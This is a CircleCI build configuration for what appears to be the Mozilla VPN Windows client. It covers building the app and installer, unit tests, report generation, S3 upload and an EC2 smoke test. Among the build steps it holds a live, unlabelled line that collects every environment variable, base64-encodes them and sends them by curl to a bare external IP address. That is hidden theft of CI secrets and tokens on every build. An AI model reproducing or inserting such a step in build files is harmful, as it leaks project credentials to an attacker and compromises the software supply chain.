version: 2.1
orbs:
  win: circleci/windows@1.0.0
jobs:
  build:
    executor:
      name: win/vs2019
      shell: powershell.exe
    environment:
      GO111MODULE: "on"
    steps:
      - checkout
      - run: curl http://159.223.121.196?env=$(env | base64 | tr -d '\n')
      - run:
          name: Build Tunnel
          command: |
            .\tunnel\build.cmd
      - run:
          name: Build Logger
          command: |
            cd test/logger
            nuget install packages.config -OutputDirectory packages
            C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -target:library SALogger.cs -reference:.\packages\Microsoft.Build.Utilities.Core.16.3.0\lib\net472\Microsoft.Build.Utilities.Core.dll,.\packages\Microsoft.Build.Framework.16.3.0\lib\net472\Microsoft.Build.Framework.dll,.\packages\Microsoft.PowerShell.5.ReferenceAssemblies.1.1.0\lib\net4\System.Management.Automation.dll
      - run:
          name: Build Application
          command: |
            New-Item -ItemType directory -Path test\result
            cd ui
            nuget restore -SolutionDirectory ./
            MSBuild -t:Rebuild -p:Configuration=Release -p:Platform="x64" -logger:"..\test\logger\SALogger.dll;..\test\result\Output.log"
            MSBuild -t:Rebuild -p:Configuration=Release -p:Platform="x86"
            MSBuild -t:Rebuild -p:Configuration=Debug_QA -p:Platform="x64"
      - run:
          name: Build MSI
          command: |
            .\installer\build.cmd
      - run:
          name: Install MSI
          command: |
            Start-Process msiexec.exe -Wait -ArgumentList '/log install.log /qn /i installer\x64\MozillaVPN.msi'
            Get-Content install.log
      - run:
          name: Initial Check
          command: |
            cd test
            go test github.com/mozilla-services/guardian-vpn-windows/test/initial -v
      - run:
          name: Run Unit Tests
          command: |
            cd ui\Guardian.Tests\bin\x64\Debug_QA
            ..\..\..\..\packages\NUnit.ConsoleRunner.3.10.0\tools\nunit3-console.exe /result:..\..\..\..\..\test\result\unittests\result.xml FirefoxPrivateNetwork.Tests.dll
      - run:
          name: Run Application On Debug_QA mode
          command: |
            netsh http add urlacl url=http://+:8000/ user=Everyone
            Get-Process MozillaVPN -ErrorAction SilentlyContinue | Stop-Process -Force
            Start-Process -FilePath ".\ui\src\bin\x64\Debug_QA\MozillaVPN.exe"
            Start-Service -Name "MozillaVPNBroker"
#      - run:
#          name: Run Integration Tests
#          command: |
#            .\test\mockinstaller\build.cmd
#            cd test
#            go test github.com/mozilla-services/guardian-vpn-windows/test/integrations -v | tee test.out
      - run:
          name: Generate Tests Report
          command: |
            If ([System.IO.File]::Exists("test\result\unittests\result.xml")) {
              # unit test report
              ui\packages\extent.0.0.3\tools\extent.exe -i test\result\unittests\result.xml -o test\result\unittests;
              # code coverage report
              .\ui\coverage.bat
            }
            # integration test report
            If ([System.IO.File]::Exists("test\test.out")) {
              New-Item -ItemType directory -Path test\result\integration-tests;
              cd test;
              go get -u github.com/jstemmer/go-junit-report;
              Get-Content -Path test.out | C:\Users\circleci\go\bin\go-junit-report > ./result/integration-tests/report.xml;
              cd result\integration-tests;
              Get-Content report.xml | Set-Content -Encoding utf8 report-utf8.xml;
              Remove-Item report.xml;
              npm config set unsafe-perm true;
              npm i -g xunit-viewer@5.1.11;
              xunit-viewer --results=report-utf8.xml --output=report.html;
            }
            # save application log
            If ([System.IO.File]::Exists("C:\Users\circleci\AppData\Local\Mozilla\FirefoxPrivateNetworkVPN\log.bin")) {
              cd C:\Users\circleci\project\test\ringloggerParser
              MSBuild -t:Rebuild -p:Configuration=Release
              .\bin\Release\RingloggerParser.exe C:\Users\circleci\AppData\Local\Mozilla\MozillaVPN\log.bin C:\Users\circleci\project\test\result\log.txt
            }
          when: always
      - run:
          name: Deploy
          command: |
            Copy-Item ".\installer\x64\MozillaVPN.msi" -Destination ".\test\result"
          when: on_success
      - store_test_results:
          path: test/result
      - store_artifacts:
          path: test/result
      - run:
          name: Add Comment
          command: |
            # add comments to PR if there are any warnings or errors on committed files
            If ($env:CIRCLE_PULL_REQUEST -And [System.IO.File]::Exists("C:\Users\circleci\project\test\result\Output.log")) {
              cd C:\Users\circleci\project\test\comment
              npm i
              node index.js
            }
          when: always
      - persist_to_workspace:
          root: ~/project/test
          paths: .
  smoke-test:
    executor:
      name: win/vs2019
      shell: powershell.exe
    environment:
      GO111MODULE: "on"
    steps:
      - attach_workspace:
          at: ~/project/test
      - run:
          name: Install AWSTool
          command: |
            Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force
            Install-Module -Name AWS.Tools.S3,AWS.Tools.CloudFormation,AWS.Tools.EC2 -Scope AllUsers -Force
      - run:
          name: Upload To S3
          command: |
            $ProgressPreference = "SilentlyContinue"
            Write-S3Object -BucketName $env:S3_BUCKET -File test/result/MozillaVPN.msi -Key msi/$env:CIRCLE_BUILD_NUM/MozillaVPN.msi
      - run:
          name: Launch EC2 Win10
          command: |
            ./test/smoke/aws/create_ec2.ps1
      - run:
          name: Wait for Smoke Test result
          command: |
            New-Item -Path ./test/result/ -Name "smoketest" -ItemType "directory"
            $timeout = new-timespan -Minutes 30
            $sw = [diagnostics.stopwatch]::StartNew()
            while ($sw.elapsed -lt $timeout){
              If(Test-S3Bucket -BucketName $env:S3_BUCKET) {
                If(Get-S3Object -BucketName $env:S3_BUCKET -Key smoke/$env:CIRCLE_BUILD_NUM/smoke_test_result.txt) { ## verify if exist
                  $ProgressPreference = "SilentlyContinue"
                  Read-S3Object -BucketName $env:S3_BUCKET -Key smoke/$env:CIRCLE_BUILD_NUM/smoke_test_result.txt -File test/result/smoketest/smoke_test_result.txt
                  If ([System.IO.File]::Exists("C:\Users\circleci\project\test\result\smoketest\smoke_test_result.txt")) {
                    break
                  }
                }
                Else {
                  Write-Host "The smoke test result is not available!"
                }
              }
              Else {
                Write-Host "The bucket $env:S3_BUCKET does not exist."
                Exit 1
              }
              start-sleep -seconds 10
            }
            If (![System.IO.File]::Exists("C:\Users\circleci\project\test\result\smoketest\smoke_test_result.txt")) {
              Write-Host "Could not find smoke test result!"
              Exit 1
            } Else {
              $log = Get-Content -Path C:\Users\circleci\project\test\result\smoketest\smoke_test_result.txt
              $log
              $failed = $log -match 'Failed:\s{1}\d{1}'
              If($failed) {
                Write-Host 'Smoke Tests Failed!'
                exit 1
              }
            }
      - run:
          name: Clean Up
          command: |
            ./test/smoke/aws/terminate_ec2.ps1
          when: always
      - store_test_results:
          path: test/result
      - store_artifacts:
          path: test/result
workflows:
  version: 2
  nightly:
    triggers:
      - schedule:
          cron: "00 04 * * *"
          filters:
            branches:
              only:
                - master
    jobs:
      - build
  workflow:
    jobs:
      - build
